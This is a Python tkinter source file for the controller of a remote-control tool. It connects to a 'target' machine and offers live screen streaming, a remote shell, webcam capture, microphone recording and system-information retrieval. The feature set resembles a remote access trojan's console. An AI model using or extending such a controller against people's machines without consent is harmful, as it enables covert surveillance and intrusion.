"""
远程控制客户端 - 可视化增强版（修复版）
修复了协议混乱、socket竞争等问题
"""

import tkinter as tk
from tkinter import messagebox, simpledialog, filedialog, ttk, scrolledtext
import socket
import threading
import json
import struct
import io
import time
from datetime import datetime
from PIL import Image, ImageTk

from protocol import *
from config import SERVER_PORT, AUTH_PASSWORD_HASH
from gui_theme import COLORS, FONTS, PADDING

class VisualClientUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Remote Control - Visual Commander [MASTER]")
        self.geometry("1200x700")
        self.configure(bg=COLORS['bg_dark'])

        self.sock = None
        self.is_connected = False
        self.stream_window = None
        self.monitor_running = False
        self.streaming = False
        self.system_data = {}

        # 添加socket锁，防止多线程竞争
        self.sock_lock = threading.Lock()

        self._init_login_ui()

    def _init_login_ui(self):
        """初始化登录界面"""
        self.login_frame = tk.Frame(self, bg=COLORS['bg_dark'])
        self.login_frame.place(relx=0.5, rely=0.5, anchor='center')

        # 标题
        title = tk.Label(self.login_frame, text="◢ TARGET CONNECTION ◣",
                        font=FONTS['h1'], bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        title.pack(pady=20)

        # 输入框区域
        input_frame = tk.Frame(self.login_frame, bg=COLORS['bg_lighter'], bd=2, relief='solid')
        input_frame.pack(padx=40, pady=20)

        tk.Label(input_frame, text="Target IP:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).grid(row=0, column=0, padx=10, pady=10, sticky='e')
        self.entry_ip = tk.Entry(input_frame, font=FONTS['mono'], bg='#333',
                                fg='white', insertbackground='white', width=25)
        self.entry_ip.insert(0, "127.0.0.1")
        self.entry_ip.grid(row=0, column=1, padx=10, pady=10)

        tk.Label(input_frame, text="Password:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).grid(row=1, column=0, padx=10, pady=10, sticky='e')
        self.entry_pwd = tk.Entry(input_frame, show="●", font=FONTS['mono'],
                                 bg='#333', fg='white', insertbackground='white', width=25)
        self.entry_pwd.grid(row=1, column=1, padx=10, pady=10)

        # 连接按钮
        btn_connect = tk.Button(self.login_frame, text="▶ ESTABLISH CONNECTION",
                               command=self.connect_to_server,
                               bg=COLORS['fg_primary'], fg='black',
                               font=FONTS['h2'], relief='flat', cursor='hand2')
        btn_connect.pack(pady=20, fill='x', padx=40)

    def _init_dashboard_ui(self):
        """初始化可视化仪表盘"""
        # 在销毁前保存IP地址
        self.target_ip = self.entry_ip.get()
        self.login_frame.destroy()

        # 顶部状态栏
        self._create_header()

        # 主内容区 - 使用Notebook创建多标签页
        self.notebook = ttk.Notebook(self)
        self._style_notebook()
        self.notebook.pack(fill='both', expand=True, padx=PADDING, pady=PADDING)

        # 创建各个功能标签页
        self._create_dashboard_tab()      # 仪表盘（系统监控）
        self._create_screen_tab()         # 屏幕监控
        self._create_shell_tab()          # Shell终端
        self._create_history_tab()        # 操作历史

        # 底部快捷操作栏
        self._create_quick_actions()

        # 启动后台监控线程
        self.start_monitoring()

    def _style_notebook(self):
        """自定义Notebook样式"""
        style = ttk.Style()
        style.theme_create("geek", parent="alt", settings={
            "TNotebook": {"configure": {"background": COLORS['bg_dark'], "borderwidth": 0}},
            "TNotebook.Tab": {
                "configure": {"background": COLORS['btn_bg'], "foreground": COLORS['fg_white'],
                            "padding": [20, 10], "font": FONTS['body']},
                "map": {"background": [("selected", COLORS['bg_lighter'])],
                       "foreground": [("selected", COLORS['fg_primary'])]}
            }
        })
        style.theme_use("geek")

    def _create_header(self):
        """创建顶部状态栏"""
        header = tk.Frame(self, bg=COLORS['bg_lighter'], height=60)
        header.pack(fill='x')
        header.pack_propagate(False)

        # 左侧状态
        left_frame = tk.Frame(header, bg=COLORS['bg_lighter'])
        left_frame.pack(side='left', padx=20)

        tk.Label(left_frame, text="● CONNECTED", font=FONTS['status'],
                bg=COLORS['bg_lighter'], fg=COLORS['fg_success']).pack(anchor='w')

        self.lbl_target = tk.Label(left_frame, text=f"Target: {self.target_ip}",
                                  font=FONTS['mono'], bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'])
        self.lbl_target.pack(anchor='w')

        # 右侧时间和断开按钮
        right_frame = tk.Frame(header, bg=COLORS['bg_lighter'])
        right_frame.pack(side='right', padx=20)

        self.lbl_time = tk.Label(right_frame, text="", font=FONTS['body'],
                                bg=COLORS['bg_lighter'], fg=COLORS['fg_white'])
        self.lbl_time.pack(side='left', padx=10)
        self._update_time()

        btn_disconnect = tk.Button(right_frame, text="✖ DISCONNECT", command=self.disconnect,
                                  bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                                  relief='flat', cursor='hand2')
        btn_disconnect.pack(side='right')

    def _update_time(self):
        """更新时间显示"""
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.lbl_time.config(text=now)
        self.after(1000, self._update_time)

    # ==================== 标签页1: 系统监控仪表盘 ====================

    def _create_dashboard_tab(self):
        """创建系统监控仪表盘"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="📊 DASHBOARD")

        # 左侧：实时监控指标
        left_panel = tk.Frame(tab, bg=COLORS['bg_dark'])
        left_panel.pack(side='left', fill='both', expand=True, padx=10, pady=10)

        # 系统信息卡片
        self._create_metric_card(left_panel, "SYSTEM INFO", 0)
        self.sys_info_labels = {}
        info_frame = tk.Frame(left_panel, bg=COLORS['bg_lighter'])
        info_frame.pack(fill='x', pady=(0, 10))

        for i, key in enumerate(['OS', 'Hostname', 'IP', 'CPU Cores']):
            tk.Label(info_frame, text=f"{key}:", font=FONTS['small'],
                    bg=COLORS['bg_lighter'], fg=COLORS['fg_white']).grid(row=i, column=0, sticky='w', padx=10, pady=2)
            lbl = tk.Label(info_frame, text="Loading...", font=FONTS['small'],
                          bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'])
            lbl.grid(row=i, column=1, sticky='w', padx=10, pady=2)
            self.sys_info_labels[key] = lbl

        # CPU使用率
        self._create_metric_card(left_panel, "CPU USAGE", 1)
        self.cpu_progress = self._create_progress_bar(left_panel)
        self.lbl_cpu = tk.Label(left_panel, text="0%", font=FONTS['h2'],
                               bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        self.lbl_cpu.pack()

        # 内存使用率
        self._create_metric_card(left_panel, "MEMORY USAGE", 2)
        self.mem_progress = self._create_progress_bar(left_panel)
        self.lbl_mem = tk.Label(left_panel, text="0% (0/0 GB)", font=FONTS['body'],
                               bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        self.lbl_mem.pack()

        # 磁盘使用率
        self._create_metric_card(left_panel, "DISK USAGE", 3)
        self.disk_progress = self._create_progress_bar(left_panel)
        self.lbl_disk = tk.Label(left_panel, text="0% (0/0 GB)", font=FONTS['body'],
                                bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        self.lbl_disk.pack()

        # 右侧：网络监控和系统状态
        right_panel = tk.Frame(tab, bg=COLORS['bg_dark'])
        right_panel.pack(side='right', fill='both', expand=True, padx=10, pady=10)

        # 网络连接数
        self._create_metric_card(right_panel, "NETWORK CONNECTIONS", 0)
        self.lbl_network = tk.Label(right_panel, text="0 Active", font=FONTS['h2'],
                                   bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
        self.lbl_network.pack(pady=10)

        # 进程数量
        self._create_metric_card(right_panel, "RUNNING PROCESSES", 1)
        self.lbl_processes = tk.Label(right_panel, text="0 Processes", font=FONTS['h2'],
                                     bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
        self.lbl_processes.pack(pady=10)

        # 系统运行时间
        self._create_metric_card(right_panel, "UPTIME", 2)
        self.lbl_uptime = tk.Label(right_panel, text="0d 0h 0m", font=FONTS['h2'],
                                  bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
        self.lbl_uptime.pack(pady=10)

        # 实时日志
        self._create_metric_card(right_panel, "SYSTEM LOG", 3)
        self.log_dashboard = scrolledtext.ScrolledText(right_panel, height=10,
                                                       bg='black', fg=COLORS['fg_secondary'],
                                                       font=FONTS['small'])
        self.log_dashboard.pack(fill='both', expand=True)

    def _create_metric_card(self, parent, title, row):
        """创建指标卡片标题"""
        lbl = tk.Label(parent, text=f"[ {title} ]", font=FONTS['body'],
                      bg=COLORS['bg_dark'], fg=COLORS['fg_white'])
        lbl.pack(anchor='w', pady=(10 if row > 0 else 0, 5))

    def _create_progress_bar(self, parent):
        """创建进度条"""
        canvas = tk.Canvas(parent, height=20, bg=COLORS['bg_dark'], highlightthickness=0)
        canvas.pack(fill='x', pady=5)

        # 背景条
        canvas.create_rectangle(0, 0, 400, 20, fill=COLORS['progress_bg'], outline='')
        # 进度条（初始为0）
        bar = canvas.create_rectangle(0, 0, 0, 20, fill=COLORS['progress_fill'], outline='')
        canvas.bar = bar
        return canvas

    # ==================== 标签页2: 屏幕监控 ====================

    def _create_screen_tab(self):
        """创建屏幕监控标签"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="🖥️ SCREEN")

        # 控制栏
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        self.btn_start_stream = tk.Button(control_frame, text="▶ START STREAM",
                                          command=self.start_screen_stream,
                                          bg=COLORS['fg_success'], fg='black', font=FONTS['body'],
                                          relief='flat')
        self.btn_start_stream.pack(side='left', padx=5)

        self.btn_stop_stream = tk.Button(control_frame, text="⏹ STOP STREAM",
                                         command=self.stop_screen_stream,
                                         bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                                         relief='flat', state='disabled')
        self.btn_stop_stream.pack(side='left', padx=5)

        tk.Button(control_frame, text="📸 SCREENSHOT", command=self.take_screenshot,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Label(control_frame, text="Quality:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).pack(side='left', padx=10)

        self.quality_scale = tk.Scale(control_frame, from_=10, to=100, orient='horizontal',
                                     bg=COLORS['bg_lighter'], fg='white',
                                     highlightthickness=0, length=150)
        self.quality_scale.set(50)
        self.quality_scale.pack(side='left')

        # 屏幕显示区域
        self.screen_label = tk.Label(tab, bg='black', text="Screen stream will appear here\nClick START STREAM",
                                    fg=COLORS['fg_white'], font=FONTS['h2'])
        self.screen_label.pack(fill='both', expand=True, padx=10, pady=10)

    # ==================== 标签页3: Shell终端 ====================

    def _create_shell_tab(self):
        """创建Shell终端"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="💻 SHELL")

        # 终端显示区
        self.shell_text = scrolledtext.ScrolledText(tab, bg='black', fg=COLORS['fg_primary'],
                                                    font=FONTS['mono'], insertbackground='white')
        self.shell_text.pack(fill='both', expand=True, padx=10, pady=10)
        self.shell_text.insert(tk.END, "Remote Shell Session\n")
        self.shell_text.insert(tk.END, "=" * 60 + "\n")
        self.shell_text.insert(tk.END, "> ")

        # 命令输入框
        input_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        input_frame.pack(fill='x', padx=10, pady=(0, 10))

        tk.Label(input_frame, text=">", font=FONTS['mono'], bg=COLORS['bg_dark'],
                fg=COLORS['fg_primary']).pack(side='left', padx=5)

        self.shell_entry = tk.Entry(input_frame, font=FONTS['mono'], bg='#333',
                                    fg='white', insertbackground='white')
        self.shell_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.shell_entry.bind('<Return>', self.send_shell_command)

        tk.Button(input_frame, text="SEND", command=lambda: self.send_shell_command(None),
                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
                 relief='flat').pack(side='right', padx=5)

    # ==================== 标签页4: 操作历史 ====================

    def _create_history_tab(self):
        """创建操作历史时间线"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="📜 HISTORY")

        # 顶部控制
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        tk.Button(control_frame, text="🗑️ CLEAR", command=self.clear_history,
                 bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(control_frame, text="💾 EXPORT", command=self.export_history,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        # 历史记录列表
        list_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        list_frame.pack(fill='both', expand=True, padx=10, pady=10)

        columns = ('Time', 'Action', 'Details', 'Status')
        self.history_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=25)

        for col in columns:
            self.history_tree.heading(col, text=col)
            width = 150 if col == 'Time' else (200 if col == 'Action' else 400)
            self.history_tree.column(col, width=width)

        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.history_tree.yview)
        self.history_tree.configure(yscrollcommand=scrollbar.set)

        self.history_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

    # ==================== 底部快捷操作栏 ====================

    def _create_quick_actions(self):
        """创建底部快捷操作栏"""
        quick_frame = tk.Frame(self, bg=COLORS['bg_lighter'], height=50)
        quick_frame.pack(fill='x', side='bottom')
        quick_frame.pack_propagate(False)

        tk.Label(quick_frame, text="QUICK ACTIONS:", font=FONTS['body'],
                bg=COLORS['bg_lighter'], fg=COLORS['fg_white']).pack(side='left', padx=10)

        actions = [
            ("📸 Screenshot", self.req_screenshot),
            ("📷 Camera", self.req_camera),
            ("🎤 Mic Record", self.req_mic_record),
            ("ℹ️ Sys Info", self.req_sys_info_full),
        ]

        for text, cmd in actions:
            btn = tk.Button(quick_frame, text=text, command=cmd, bg=COLORS['btn_bg'],
                          fg='white', font=FONTS['small'], relief='flat', cursor='hand2')
            btn.pack(side='left', padx=5)

    # ==================== 网络连接逻辑 ====================

    def connect_to_server(self):
        """连接到服务器"""
        ip = self.entry_ip.get()
        pwd = self.entry_pwd.get()

        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((ip, SERVER_PORT))

            # 身份验证
            import hashlib
            pwd_hash = hashlib.sha256(pwd.encode()).hexdigest()

            auth_msg = create_auth_message(pwd_hash)
            send_message(self.sock, auth_msg)

            resp = receive_message(self.sock)
            if resp and resp['type'] == MessageType.AUTH_RESPONSE and resp['data']['success']:
                self.is_connected = True
                self.sock.settimeout(None)
                self._init_dashboard_ui()
                self.add_history("Connection", f"Connected to {ip}:{SERVER_PORT}", "Success")
            else:
                messagebox.showerror("Error", "Authentication Failed")
                self.sock.close()

        except Exception as e:
            messagebox.showerror("Connection Error", str(e))

    def disconnect(self):
        """断开连接"""
        self.monitor_running = False
        self.streaming = False
        if self.sock:
            try:
                send_message(self.sock, create_disconnect_message())
                self.sock.close()
            except:
                pass
        self.destroy()

    # ==================== 监控功能 ====================

    def start_monitoring(self):
        """启动后台监控"""
        self.monitor_running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()

    def _monitor_loop(self):
        """监控循环 - 定期获取系统信息"""
        while self.monitor_running:
            # 如果正在进行屏幕流，暂停监控以避免冲突
            if self.streaming:
                time.sleep(1)
                continue

            try:
                with self.sock_lock:
                    # 获取系统信息
                    send_message(self.sock, create_system_info_message())
                    msg = receive_message(self.sock)

                if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
                    info = msg['data']['info']
                    self.system_data = info
                    self.after(0, lambda i=info: self._update_dashboard(i))

                time.sleep(3)  # 每3秒更新一次
            except Exception as e:
                print(f"Monitor error: {e}")
                time.sleep(5)

    def _update_dashboard(self, info):
        """更新仪表盘数据"""
        try:
            # 更新系统信息
            if 'platform' in info:
                self.sys_info_labels['OS'].config(text=info.get('platform', 'N/A'))
            if 'hostname' in info:
                self.sys_info_labels['Hostname'].config(text=info.get('hostname', 'N/A'))
            if 'ip_address' in info:
                self.sys_info_labels['IP'].config(text=info.get('ip_address', 'N/A'))
            if 'cpu_count' in info:
                self.sys_info_labels['CPU Cores'].config(text=str(info.get('cpu_count', 'N/A')))

            # 更新CPU
            cpu_percent = info.get('cpu_percent', 0)
            self._update_progress(self.cpu_progress, cpu_percent)
            self.lbl_cpu.config(text=f"{cpu_percent:.1f}%")

            # 更新内存
            mem = info.get('memory', {})
            mem_percent = mem.get('percent', 0)
            mem_used = mem.get('used', 0) / (1024**3)  # 转换为GB
            mem_total = mem.get('total', 0) / (1024**3)
            self._update_progress(self.mem_progress, mem_percent)
            self.lbl_mem.config(text=f"{mem_percent:.1f}% ({mem_used:.1f}/{mem_total:.1f} GB)")

            # 更新磁盘
            disk = info.get('disk', {})
            disk_percent = disk.get('percent', 0)
            disk_used = disk.get('used', 0) / (1024**3)
            disk_total = disk.get('total', 0) / (1024**3)
            self._update_progress(self.disk_progress, disk_percent)
            self.lbl_disk.config(text=f"{disk_percent:.1f}% ({disk_used:.1f}/{disk_total:.1f} GB)")

            # 更新其他信息
            self.lbl_network.config(text=f"{info.get('network_connections', 0)} Active")
            self.lbl_processes.config(text=f"{info.get('process_count', 0)} Processes")

            # 运行时间
            uptime = info.get('uptime', 0)
            days = uptime // 86400
            hours = (uptime % 86400) // 3600
            minutes = (uptime % 3600) // 60
            self.lbl_uptime.config(text=f"{days}d {hours}h {minutes}m")

            # 日志
            self.log_to_dashboard(f"System stats updated - CPU: {cpu_percent:.1f}% | MEM: {mem_percent:.1f}%")
        except Exception as e:
            print(f"Update dashboard error: {e}")

    def _update_progress(self, canvas, percent):
        """更新进度条"""
        width = canvas.winfo_width()
        if width <= 1:
            width = 400  # 默认宽度
        fill_width = (width * percent) / 100
        canvas.coords(canvas.bar, 0, 0, fill_width, 20)

        # 根据百分比改变颜色
        if percent < 60:
            color = COLORS['fg_success']
        elif percent < 80:
            color = COLORS['fg_warning']
        else:
            color = COLORS['fg_danger']
        canvas.itemconfig(canvas.bar, fill=color)

    def log_to_dashboard(self, msg):
        """写入仪表盘日志"""
        try:
            timestamp = datetime.now().strftime("[%H:%M:%S]")
            self.log_dashboard.insert(tk.END, f"{timestamp} {msg}\n")
            self.log_dashboard.see(tk.END)
        except:
            pass

    # ==================== 屏幕监控功能 ====================

    def start_screen_stream(self):
        """开始屏幕流"""
        if self.streaming:
            return

        quality = self.quality_scale.get()

        with self.sock_lock:
            send_message(self.sock, create_screen_start_message(fps=10, quality=quality))

        self.streaming = True
        self.btn_start_stream.config(state='disabled')
        self.btn_stop_stream.config(state='normal')

        threading.Thread(target=self._screen_stream_loop, daemon=True).start()
        self.add_history("Screen", "Started screen streaming", "Success")
        self.log_to_dashboard("Screen streaming started")

    def stop_screen_stream(self):
        """停止屏幕流"""
        self.streaming = False

        with self.sock_lock:
            send_message(self.sock, create_screen_stop_message())

        self.screen_label.config(image='', text="Stream stopped\nClick START STREAM to resume")
        self.btn_start_stream.config(state='normal')
        self.btn_stop_stream.config(state='disabled')
        self.add_history("Screen", "Stopped screen streaming", "Success")
        self.log_to_dashboard("Screen streaming stopped")

    def _screen_stream_loop(self):
        """屏幕流接收循环"""
        try:
            # 接收开始响应
            with self.sock_lock:
                _ = receive_message(self.sock)

            while self.streaming:
                try:
                    with self.sock_lock:
                        msg = receive_message(self.sock)
                        if not msg:
                            break

                        if msg['type'] == MessageType.SCREEN_FRAME:
                            img_bytes = receive_binary_data(self.sock)
                            if img_bytes:
                                image = Image.open(io.BytesIO(img_bytes))
                                # 缩放以适应标签页
                                image.thumbnail((900, 500))
                                photo = ImageTk.PhotoImage(image)

                                if self.streaming:
                                    self.after(0, lambda p=photo: self._update_screen_frame(p))
                        elif msg['type'] == MessageType.SCREEN_STOP:
                            break
                except Exception as e:
                    print(f"Stream frame error: {e}")
                    break
        except Exception as e:
            print(f"Stream error: {e}")
        finally:
            self.streaming = False
            self.after(0, lambda: self.btn_start_stream.config(state='normal'))
            self.after(0, lambda: self.btn_stop_stream.config(state='disabled'))

    def _update_screen_frame(self, photo):
        """更新屏幕帧"""
        try:
            self.screen_label.configure(image=photo, text='')
            self.screen_label.image = photo
        except:
            pass

    def take_screenshot(self):
        """截取屏幕截图"""
        self.req_screenshot()

    # ==================== Shell功能 ====================

    def send_shell_command(self, event):
        """发送Shell命令"""
        cmd = self.shell_entry.get()
        if not cmd:
            return

        self.shell_entry.delete(0, tk.END)
        self.shell_text.insert(tk.END, f"{cmd}\n")

        # 发送命令
        with self.sock_lock:
            send_message(self.sock, create_shell_message(cmd))

        # 接收响应
        threading.Thread(target=self._wait_shell_response, daemon=True).start()

        self.add_history("Shell", f"Executed: {cmd}", "Success")

    def _wait_shell_response(self):
        """等待Shell响应"""
        try:
            with self.sock_lock:
                resp = receive_message(self.sock)
            if resp and resp['type'] == MessageType.SHELL_RESPONSE:
                output = resp['data']['output']
                self.after(0, lambda: self.shell_text.insert(tk.END, f"{output}\n> "))
        except Exception as e:
            print(f"Shell response error: {e}")

    # ==================== 快捷操作功能 ====================

    def req_screenshot(self):
        """请求截图"""
        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_screenshot_message())
                    header = receive_message(self.sock)
                    if header and header['type'] == MessageType.SCREENSHOT_DATA:
                        img_data = receive_binary_data(self.sock)
                        if img_data:
                            self.after(0, lambda: self._show_image(img_data, "Screenshot"))
                            self.add_history("Screenshot", "Captured screenshot", "Success")
            except Exception as e:
                print(f"Screenshot error: {e}")
        threading.Thread(target=_thread, daemon=True).start()

    def req_camera(self):
        """请求摄像头拍照"""
        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_camera_message())
                    header = receive_message(self.sock)
                    if header and header['type'] == MessageType.CAMERA_DATA:
                        if header['data']['success']:
                            img_data = receive_binary_data(self.sock)
                            self.after(0, lambda: self._show_image(img_data, "Camera Photo"))
                            self.add_history("Camera", "Captured camera photo", "Success")
            except Exception as e:
                print(f"Camera error: {e}")
        threading.Thread(target=_thread, daemon=True).start()

    def req_mic_record(self):
        """请求麦克风录音"""
        duration = simpledialog.askinteger("Microphone", "Recording duration (seconds):",
                                          initialvalue=5, minvalue=1, maxvalue=60)
        if duration:
            def _thread():
                try:
                    with self.sock_lock:
                        send_message(self.sock, create_mic_record_message(duration=duration))
                        header = receive_message(self.sock)
                        if header and header['type'] == MessageType.MIC_RECORD_RESPONSE:
                            if header['data']['success']:
                                audio_data = receive_binary_data(self.sock)
                                save_path = filedialog.asksaveasfilename(defaultextension=".wav",
                                                                         filetypes=[("WAV files", "*.wav")])
                                if save_path:
                                    with open(save_path, 'wb') as f:
                                        f.write(audio_data)
                                    self.after(0, lambda: messagebox.showinfo("Success", f"Audio saved to {save_path}"))
                                    self.add_history("Microphone", f"Recorded {duration}s audio", "Success")
                except Exception as e:
                    print(f"Mic record error: {e}")
            threading.Thread(target=_thread, daemon=True).start()

    def req_sys_info_full(self):
        """请求完整系统信息"""
        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_system_info_message())
                    msg = receive_message(self.sock)
                    if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
                        info = msg['data']['info']
                        formatted = json.dumps(info, indent=2)

                        # 显示在新窗口
                        def show():
                            viewer = tk.Toplevel(self)
                            viewer.title("System Information")
                            viewer.geometry("600x500")
                            viewer.configure(bg=COLORS['bg_dark'])

                            text = scrolledtext.ScrolledText(viewer, bg='black', fg=COLORS['fg_secondary'],
                                                            font=FONTS['mono'])
                            text.pack(fill='both', expand=True, padx=10, pady=10)
                            text.insert(tk.END, formatted)

                        self.after(0, show)
                        self.add_history("System Info", "Retrieved full system info", "Success")
            except Exception as e:
                print(f"Sys info error: {e}")
        threading.Thread(target=_thread, daemon=True).start()

    def _show_image(self, img_data, title="Image"):
        """显示图片"""
        top = tk.Toplevel(self)
        top.title(title)
        top.configure(bg='black')

        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((1280, 720))
        photo = ImageTk.PhotoImage(img)

        lbl = tk.Label(top, image=photo, bg='black')
        lbl.image = photo
        lbl.pack()

    # ==================== 操作历史功能 ====================

    def add_history(self, action, details, status):
        """添加操作历史记录"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.history_tree.insert('', 0, values=(timestamp, action, details, status))
        except:
            pass

    def clear_history(self):
        """清空历史记录"""
        if messagebox.askyesno("Confirm", "Clear all history?"):
            for item in self.history_tree.get_children():
                self.history_tree.delete(item)

    def export_history(self):
        """导出历史记录"""
        save_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv")])
        if save_path:
            with open(save_path, 'w') as f:
                f.write("Operation History Export\n")
                f.write("="*80 + "\n\n")
                for item in self.history_tree.get_children():
                    values = self.history_tree.item(item)['values']
                    f.write(f"{values[0]} | {values[1]} | {values[2]} | {values[3]}\n")
            messagebox.showinfo("Success", f"History exported to {save_path}")


if __name__ == "__main__":
    app = VisualClientUI()
    app.mainloop()
